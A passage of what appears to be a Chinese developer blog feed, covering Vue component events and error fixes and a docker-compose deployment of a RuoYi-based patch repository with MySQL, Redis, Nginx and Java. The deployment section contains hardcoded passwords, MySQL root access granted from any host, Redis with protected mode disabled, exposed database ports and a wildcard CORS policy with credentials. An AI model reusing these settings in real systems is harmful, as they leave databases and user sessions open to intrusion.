&lt;h4&gt;&#123;&#123; title &#125;&#125;&lt;/h4&gt;</span><br><span class="line">    &lt;button @click=&quot;$emit(&#x27;enlarge-text&#x27;)&quot;&gt;Enlarge text&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup&gt;</span><br><span class="line">defineProps([&#x27;title&#x27;])</span><br><span class="line">defineEmits([&#x27;enlarge-text&#x27;])</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>父组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div :style=&quot;&#123; fontSize: postFontSize + &#x27;em&#x27; &#125;&quot;&gt;</span><br><span class="line">    &lt;BlogPost</span><br><span class="line">      v-for=&quot;post in posts&quot;</span><br><span class="line">      :key=&quot;post.id&quot;</span><br><span class="line">      :title=&quot;post.title&quot;</span><br><span class="line">      @enlarge-text=&quot;postFontSize += 0.1&quot;</span><br><span class="line">    &gt;&lt;/BlogPost&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123; ref &#125; from &#x27;vue&#x27;</span><br><span class="line">import BlogPost from &#x27;./BlogPost.vue&#x27;</span><br><span class="line">  </span><br><span class="line">const posts = ref([</span><br><span class="line">  &#123; id: 1, title: &#x27;My journey with Vue&#x27; &#125;,</span><br><span class="line">  &#123; id: 2, title: &#x27;Blogging with Vue&#x27; &#125;,</span><br><span class="line">  &#123; id: 3, title: &#x27;Why Vue is so fun&#x27; &#125;</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">const postFontSize = ref(1)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>因为有了 <code>@enlarge-text=&quot;postFontSize += 0.1&quot;</code> 的监听，父组件会接收这一事件，从而更新 <code>postFontSize</code> 的值。</p><h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>在使用vue的时候遇到过很多小问题，记录一下</p><h3 id="报错：-TypeError-Cannot-read-properties-of-null-reading-‘setupContext’"><a href="#报错：-TypeError-Cannot-read-properties-of-null-reading-‘setupContext’" class="headerlink" title="报错： TypeError: Cannot read properties of null (reading ‘setupContext’)"></a>报错： TypeError: Cannot read properties of null (reading ‘setupContext’)</h3><p>在导入评论组件后会有这个问题，其中的<code>setupContext</code>会变成<code>isCE</code>，折腾了很久，最后在stack overflow上找到了原因：从多个包中导入了vue，解决方法很简单，在vite.config.js文件中加上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">resolve: &#123;</span><br><span class="line">  dedupe: [</span><br><span class="line">    &#x27;vue&#x27;</span><br><span class="line">  ]</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>此外 还需要<strong>将<code>Vue</code>从<code>package.json</code>中的<code>dependencies</code>中移除掉</strong></p><p>如果<code>dependencies</code>中有<code>Vue</code>依赖，那么在项目中使用时就有可能会报 Cannot read properties of null (reading ‘isCE’) 错误，因为项目中依赖的Vue版本与你组件库中依赖的可能不一样。</p><h3 id="父组件获取和修改子组件的值"><a href="#父组件获取和修改子组件的值" class="headerlink" title="父组件获取和修改子组件的值"></a>父组件获取和修改子组件的值</h3><p>方法：使用ref,在父组件中给子组件的实例对象绑定一个自定义事件实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;uploadPatchDialog ref=&quot;uploadPatchDialogRef&quot;&gt;&lt;/uploadPatchDialog&gt;</span><br><span class="line"></span><br><span class="line">const uploadPatchDialogRef = ref(null);</span><br><span class="line">function updatePatch(id) &#123;</span><br><span class="line">  uploadPatchDialogRef.value.openUploadPatchDialog = true;</span><br><span class="line">  patchDetailById.value = props.patchList.find(patch =&gt; patch.id === id);</span><br><span class="line">  uploadPatchDialogRef.value.uploadPatchForm.uid = patchDetailById.value.uid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="子组件调用父组件方法"><a href="#子组件调用父组件方法" class="headerlink" title="子组件调用父组件方法"></a>子组件调用父组件方法</h3><p>父组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> &lt;patchManagerTable :patchList=&quot;patchList&quot; @parentMehtod=&quot;getList()&quot;&gt;&lt;/patchManagerTable&gt;</span><br><span class="line"></span><br><span class="line">function getList() &#123;</span><br><span class="line">  if(searchFormRef.value != null)&#123;</span><br><span class="line">    queryParams.value.title = searchFormRef.value.patchQueryParam.title;</span><br><span class="line">    queryParams.value.platform = searchFormRef.value.patchQueryParam.platform;</span><br><span class="line">    queryParams.value.system = searchFormRef.value.patchQueryParam.system;</span><br><span class="line">    queryParams.value.descrption = searchFormRef.value.patchQueryParam.descrption;</span><br><span class="line">  &#125;</span><br><span class="line">  listPatch(queryParams.value).then(response =&gt; &#123;</span><br><span class="line">    let formattedRows = response.rows.map(patch =&gt; &#123;</span><br><span class="line">      patch.system = patch.system.slice(1, -1);</span><br><span class="line">      patch.file = patch.file.slice(1, -1);</span><br><span class="line">      patch.path = patch.path.slice(1, -1);</span><br><span class="line">      return patch;</span><br><span class="line">    &#125;);</span><br><span class="line">    patchList.value = formattedRows;</span><br><span class="line">    patchList.value.sort((a, b) =&gt; b.id - a.id);</span><br><span class="line">    total.value = response.total;</span><br><span class="line">  &#125;);</span><br><span class="line">  console.log(&quot;111&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>子组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const emit = defineEmits([ &quot;parentMehtod&quot; ]);</span><br><span class="line">emit(&#x27;parentMehtod&#x27;);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>qian-duan</category>
      
    </categories>
    
    
    <tags>
      
      <tag>qian-duan</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker-compose前后端项目部署笔记.md</title>
    <link href="/2023/11/06/Docker-compose%E5%89%8D%E5%90%8E%E7%AB%AF%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E7%AC%94%E8%AE%B0.md/"/>
    <url>/2023/11/06/Docker-compose%E5%89%8D%E5%90%8E%E7%AB%AF%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E7%AC%94%E8%AE%B0.md/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>项目：补丁仓库，用于存放上层和嵌入式人员的补丁，提供查询功能，便于复用。</p><p>框架：基于 GitHub 开源项目 RuoYi</p><ul><li>前端：Vue3 （Element-Plus）</li><li>后端：SpringBoot + SpringSecurity</li><li>数据库：Mysql8.0</li><li>中间件：Redis</li><li>部署方式：Docker-compose</li></ul><h2 id="部署过程"><a href="#部署过程" class="headerlink" title="部署过程"></a>部署过程</h2><p>首先划分模块，根据技术选型发现所需要的容器服务有：</p><p>1、MySQL</p><p>2、Redis</p><p>3、Nginx</p><p>4、Openjdk-8</p><p>根据四个模块编写 docker-compose.yml 进行</p><p>构建指令：<code>docker-compose build</code></p><p>在构建的时候如果本地有镜像默认会使用本地的镜像，但本地的镜像会被文件中的CMD修改，所以为了使用未被修改的镜像，需要使用：<code>docker-compose build --pull</code> 该指令会从远程仓库拉取镜像</p><p>启动指令：<code>docker-compose up -d</code></p><p>关闭指令：<code>docker-compose down</code></p><h3 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">version : &#x27;3&#x27;</span><br><span class="line">name: hukaichao</span><br><span class="line">services:</span><br><span class="line">  hukaichao-mysql:</span><br><span class="line">    container_name: hukaichao-mysql</span><br><span class="line">    image: mysql:8.0.35</span><br><span class="line">    restart: always</span><br><span class="line">    build:</span><br><span class="line">      context: .</span><br><span class="line">      dockerfile: mysql-dockerfile</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;3306:3306&quot;</span><br><span class="line">    volumes:</span><br><span class="line">      - ./mysql/my.cnf:/etc/my.cnf</span><br><span class="line">      - ./mysql/logs:/var/log/</span><br><span class="line">      - ./mysql/data:/var/lib/mysql</span><br><span class="line">    command: [</span><br><span class="line">          &#x27;mysqld&#x27;,</span><br><span class="line">          &#x27;--lower-case-table-names=1&#x27;</span><br><span class="line">        ]</span><br><span class="line">    environment:</span><br><span class="line">      MYSQL_DATABASE: techvision</span><br><span class="line">      MYSQL_ROOT_PASSWORD: Techvision8888</span><br><span class="line">  hukaichao-redis:</span><br><span class="line">    restart: always</span><br><span class="line">    container_name: hukaichao-redis</span><br><span class="line">    image: redis</span><br><span class="line">    build:</span><br><span class="line">      context: .</span><br><span class="line">      dockerfile: redis-dockerfile</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;6379:6379&quot;</span><br><span class="line">    volumes:</span><br><span class="line">      - ./redis/redis.conf:/home/hukaichao/redis/redis.conf</span><br><span class="line">      - ./redis/data:/data</span><br><span class="line">    command: redis-server /home/hukaichao/redis/redis.conf</span><br><span class="line">  hukaichao-nginx:</span><br><span class="line">    restart: always</span><br><span class="line">    container_name: hukaichao-nginx</span><br><span class="line">    build:</span><br><span class="line">      context: .</span><br><span class="line">      dockerfile: nginx-dockerfile</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;80:80&quot;</span><br><span class="line">    volumes:</span><br><span class="line">      - ./nginx/conf:/nginx/</span><br><span class="line">      - ./nginx/html:/usr/webapp</span><br><span class="line">      - ./nginx/logs:/var/log/nginx</span><br><span class="line">  hukaichao-server:</span><br><span class="line">    restart: always</span><br><span class="line">    container_name: hukaichao-server</span><br><span class="line">    build:</span><br><span class="line">      context: .</span><br><span class="line">      dockerfile: hukaichao-dockerfile</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;8888:8888&quot;</span><br><span class="line">    volumes:</span><br><span class="line">      - ./hukaichao/logs:/home/v2/patch/server/logs</span><br><span class="line">      - ./hukaichao/patch:/home/v2/patch/upload</span><br><span class="line">    depends_on:</span><br><span class="line">      - hukaichao-mysql</span><br><span class="line">      - hukaichao-redis</span><br><span class="line">    links:</span><br><span class="line">      - hukaichao-mysql</span><br><span class="line">      - hukaichao-redis</span><br></pre></td></tr></table></figure><p>其中的services就是 docker-compose 中的服务，其中包含了四个服务。以及四个服务的配置</p><p>在其中可以像启动docker一样指定路径映射、端口映射、采用镜像等</p><p>比较重要的是一个 docker-compose 中， <strong>所有的服务都默认在同一个网段下，但不是同一个ip</strong></p><p>四个服务的 ip 分别为 192.168.240.2 、192.168.240.3 、 192.168.240.4 、192.168.240.5</p><p>查看容器的 ip 地址的指令为 ：<code>docker inspect &lt;container_id&gt; | grep IPAddress</code></p><p>所以容器之间不能直接用 localhost 进行调用，可以通过服务名进行调用，例如后端在连接数据库时，所填写的 url 变成了<code> url: jdbc:mysql://hukaichao-mysql:3306/techvision</code> 所以从这里的网络就会衍生出一系列问题。</p><p>容器进行端口号映射之后，宿主机可以用 localhost+端口号 来调用容器内的服务，但是容器和容器之间是不能的。</p><h3 id="mysql-dockerfile"><a href="#mysql-dockerfile" class="headerlink" title="mysql-dockerfile"></a>mysql-dockerfile</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 基础镜像</span><br><span class="line">FROM mysql:8.0.35</span><br><span class="line"># author</span><br><span class="line">MAINTAINER hukaichao</span><br><span class="line"></span><br><span class="line"># 执行sql脚本</span><br><span class="line">ADD ./mysql/sql/*.sql /docker-entrypoint-initdb.d/</span><br></pre></td></tr></table></figure><p>在拉取 mysql 的镜像之后，将sql语句放到容器中的 &#x2F;docker-entrypoint-initdb.d&#x2F; 目录下，该目录下的sql语句会在容器初次启动时自动执行。mysql的文件映射如下：</p><blockquote><p>.&#x2F;mysql&#x2F;my.cnf:&#x2F;etc&#x2F;my.cnf</p><p>.&#x2F;mysql&#x2F;logs:&#x2F;var&#x2F;log&#x2F;</p><p>.&#x2F;mysql&#x2F;data:&#x2F;var&#x2F;lib&#x2F;mysql</p></blockquote><p>第一项 my.cnf 为 MySQL的配置文件，其中指定了 mysql异常的日志路径：log-error &#x3D; &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;error.log</p><p>第二项为 MySQL的日志信息</p><p>第三项为 MySQL的数据文件，其中保存的为 binlog 文件 即二进制日志文件，记录了MySQL的所有执行语句，可以根据该文件还原数据库。</p><p>在 连接容器中的 MySQL 的时候，还有其他异常，首先是后端连接不上，报错：<code>MySQL 异常: &quot;Host &#39;xxx&#39; is not allowed to connect to this MySQL server&quot;</code></p><p>这个是因为MySQL未开启MySQL远程访问权限</p><p>打开MySQL终端后输入如下指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 使用数据库mysql</span><br><span class="line">use mysql;</span><br><span class="line"># 查看主机和用户</span><br><span class="line">mysql&gt; select host, user from user;</span><br></pre></td></tr></table></figure><p>可以看到 host 全部都为localhost，为了让所有的远程 ip 都能够访问数据库，可以将其设置为 <code>%</code> ，具体指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges on *.* to &#x27;root&#x27;@&#x27;%&#x27;;</span><br><span class="line">create user &#x27;techvision&#x27;@&#x27;%&#x27; identified by &#x27;Techvision8888&#x27;;</span><br><span class="line">grant all privileges on techvision.* to &#x27;techvision&#x27;@&#x27;%&#x27;;</span><br></pre></td></tr></table></figure><p>这里可能报错：<code>You are not allowed to create a user with GRANT</code><br>解决方法是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; use mysql;</span><br><span class="line">mysql &gt; update user set host=&#x27;%&#x27; where user=&#x27;tech&#x27;;</span><br><span class="line">mysql &gt; grant all privileges on tech.* to tech@&#x27;%&#x27;</span><br></pre></td></tr></table></figure><p>还有MySQL执行sql文件插入数据发送中文乱码问题</p><p>解决方法首先要确定sql 文件是否为utf-8编码格式，然后采用指令将数据库中编码都改为 utf-8</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set character set utf8;</span><br><span class="line">SET character_set_client = utf8;</span><br><span class="line">SET character_set_results = utf8;</span><br><span class="line">SET character_set_connection = utf8;</span><br></pre></td></tr></table></figure><p>再插入中文数据就不会乱码了。</p><h3 id="redis-dockerfile"><a href="#redis-dockerfile" class="headerlink" title="redis-dockerfile"></a>redis-dockerfile</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 基础镜像</span><br><span class="line">FROM redis:7.2.2</span><br><span class="line"># author</span><br><span class="line">MAINTAINER hukaichao</span><br><span class="line"></span><br><span class="line"># 挂载目录</span><br><span class="line">VOLUME /home/hukaichao/redis</span><br><span class="line"># 创建目录</span><br><span class="line">RUN mkdir -p /home/hukaichao/redis</span><br><span class="line"># 指定路径</span><br><span class="line">WORKDIR /home/hukaichao/redis</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>redis 和 MySQL类似，挂载文件同样为配置文件和数据文件，这些是数据库中需要备份的</p><p>redis.conf 文件主要修改的地方有：</p><ul><li>注释掉绑定的ip # bind 127.0.0.1</li><li>关闭保护模式protected-mode no</li><li>为redis设置密码 requirepass Techvision8888</li></ul><p>这样才能允许除了 localhost 之外的 ip 访问 redis 数据库</p><h3 id="nginx-dockerfile"><a href="#nginx-dockerfile" class="headerlink" title="nginx-dockerfile"></a>nginx-dockerfile</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 基础镜像</span><br><span class="line">FROM nginx:latest</span><br><span class="line"># author</span><br><span class="line">MAINTAINER hukaichao</span><br><span class="line"></span><br><span class="line"># 复制启动脚本</span><br><span class="line">COPY nginx/conf/default.conf /etc/nginx/conf.d/default.conf</span><br></pre></td></tr></table></figure><p>nginx主要是部署前端代码用，前端采用 vue 写的代码</p><p>打包指令：<code>npm run build:prod</code></p><p>打包完成得到静态资源文件，需要使用 nginx 进行代理才能访问。</p><p>nginx 配置文件如下，将该配置文件替换nginx原本的配置文件即可启动。（但启动后需要手动重启一次容器，否则不生效会报 502错误，有尝试使用脚本重启nginx服务，但是没成功）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    listen  [::]:80;</span><br><span class="line">    server_name  hukaichao-nginx;</span><br><span class="line"></span><br><span class="line">    #access_log  /var/log/nginx/host.access.log  main;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root   /usr/webapp/dist;</span><br><span class="line">try_files $uri $uri/ @router;</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">location /prod-api/ &#123;</span><br><span class="line">proxy_set_header Host $http_host;</span><br><span class="line">proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">proxy_set_header REMOTE-HOST $remote_addr;</span><br><span class="line">proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_pass http://hukaichao-server:8888/;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">location @router &#123;</span><br><span class="line">            rewrite ^.*$ /index.html last;</span><br><span class="line">    &#125;</span><br><span class="line">    #error_page  404              /404.html;</span><br><span class="line"></span><br><span class="line">    # redirect server error pages to the static page /50x.html</span><br><span class="line">    #</span><br><span class="line">     error_page   500 502 503 504  /50x.html;</span><br><span class="line">     location = /50x.html &#123;</span><br><span class="line">         root   /usr/share/nginx/html;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">    # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class="line">    #</span><br><span class="line">    #location ~ \.php$ &#123;</span><br><span class="line">    #    proxy_pass   http://127.0.0.1;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line">    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class="line">    #</span><br><span class="line">    #location ~ \.php$ &#123;</span><br><span class="line">    #    root           html;</span><br><span class="line">    #    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    #    fastcgi_index  index.php;</span><br><span class="line">    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span><br><span class="line">    #    include        fastcgi_params;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line">    # deny access to .htaccess files, if Apache&#x27;s document root</span><br><span class="line">    # concurs with nginx&#x27;s one</span><br><span class="line">    #</span><br><span class="line">    #location ~ /\.ht &#123;</span><br><span class="line">    #    deny  all;</span><br><span class="line">    #&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的 location &#x2F; 即多所有的请求都生效，其中 </p><p>​root 指向生成的静态资源文件。 </p><p>​try_files $uri $uri&#x2F; @router; 和下方的 location @router 一起生效，目的是解决 vue 这种单页面前端刷新后出现400 异常，给他定向到 index.html中</p><p>​ location &#x2F;prod-api&#x2F; 是对所有以 &#x2F;prod-api&#x2F;开头的请求生效，将其进行一次代理，代理后再将请求发送到 <a href="http://hukaichao-server:8888/">http://hukaichao-server:8888/</a> 这个服务器端。目的是为了避免前端采用 post 发送请求，Apache、IIS、Nginx 等绝大多数web服务器，都不允许静态文件响应POST请求，否则会返回“HTTP&#x2F;1.1 405 Method not allowed”错误</p><p>​这里的配置注意一定要加上收尾的 <code>/</code> 不然请求会被拦截，得不到授权，springsecurity报错401。</p><p>​有的解决方式是直接用 <code>error_page 405 =200 $uri;</code>  这一行相当于是将post请求转化为了get请求，但是我这个项目依然不行，所以只能采用代理的方式解决。</p><p>此外，前端的配置文件中是有指向服务端的ip的，之前是 localhost ，现在就需要改成对应的服务的ip。</p><h3 id="hukaichao-dockerfile"><a href="#hukaichao-dockerfile" class="headerlink" title="hukaichao-dockerfile"></a>hukaichao-dockerfile</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 基础镜像</span><br><span class="line">FROM openjdk:8-jre</span><br><span class="line"># author</span><br><span class="line">MAINTAINER hukaichao</span><br><span class="line"></span><br><span class="line"># 挂载目录</span><br><span class="line">VOLUME /home/hukaichao</span><br><span class="line"># 创建目录</span><br><span class="line">RUN mkdir -p /home/hukaichao</span><br><span class="line"># 指定路径</span><br><span class="line">WORKDIR /home/hukaichao</span><br><span class="line"># 复制jar文件到路径</span><br><span class="line">COPY ./hukaichao/jar/*.jar /home/hukaichao/hukaichao.jar</span><br><span class="line"># 启动应用</span><br><span class="line">ENTRYPOINT [&quot;java&quot;,&quot;-jar&quot;,&quot;hukaichao.jar&quot;]</span><br></pre></td></tr></table></figure><p>这个倒是没什么复杂的，难的就是 jar 包里面有很多配置是需要改的，改的和其他服务的 ip 一致。</p><p>当部署时前后端出现请求传递不了的情况还有很大可能是跨域未进行配置好，此时需要在后端进行处理，允许跨域，CORS跨域资源请求也要处理好。springsecurity中的跨域配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@Bean</span><br><span class="line">public CorsFilter corsFilter() &#123;</span><br><span class="line"></span><br><span class="line">    CorsConfiguration config = new CorsConfiguration();</span><br><span class="line">    config.setAllowCredentials(true);</span><br><span class="line">    // 设置访问源地址</span><br><span class="line">    config.addAllowedOriginPattern(&quot;*&quot;);</span><br><span class="line">    // 设置访问源请求头</span><br><span class="line">    config.addAllowedHeader(&quot;*&quot;);</span><br><span class="line">    // 设置访问源请求方法</span><br><span class="line">    config.addAllowedMethod(&quot;*&quot;);</span><br><span class="line">    // 有效期 1800秒</span><br><span class="line">    config.setMaxAge(1800L);</span><br><span class="line">    // 添加映射路径,拦截一切请求</span><br><span class="line">    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();</span><br><span class="line">    source.registerCorsConfiguration(&quot;/**&quot;, config);</span><br><span class="line">    // 返回新的CorsFilter</span><br><span class="line">    return new CorsFilter(source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="部署时遇到的问题"><a href="#部署时遇到的问题" class="headerlink" title="部署时遇到的问题"></a>部署时遇到的问题</h2><h3 id="装docker-compose"><a href="#装docker-compose" class="headerlink" title="装docker-compose"></a>装docker-compose</h3><p>在服务器上，装好docker后是没有docker-compose的，这个需要单独安装，如果使用apt install安装docker-compose 安装的版本是非常低的 以至于无法启动docker-compose。所以这时可以去GitHub上下载新版本的docker-compose二进制文件：<code>https://github.com/docker/compose/releases?expanded=true</code><br>下载完成后复制到下面路径并重命名文件：<br><code>sudo cp docker-compose-linux-x86_64 /usr/local/bin/docker-compose</code></p><p>将可执行权限应用于二进制文件：<br><code>sudo chmod +x /usr/local/bin/docker-compose</code></p><p>创建软链：<br><code>sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose</code></p><p>测试是否安装成功：<br><code>docker-compose version</code></p><h3 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">failed to solve: mysql:8.0.35: error getting credentials - err: exit status 1, out: `Cannot autolaunch D-Bus without X11 $DISPLAY`</span><br></pre></td></tr></table></figure><p>这个问题出在Linux缺少一个密码管理包gnupg，它用于加密，我们在登录时需要这个包将密码加密后才能完成，因此直接安装<br><code>sudo apt install gnupg2 pass</code></p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker安装+常用指令</title>
    <link href="/2023/11/05/Docker%E5%AE%89%E8%A3%85+%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"/>
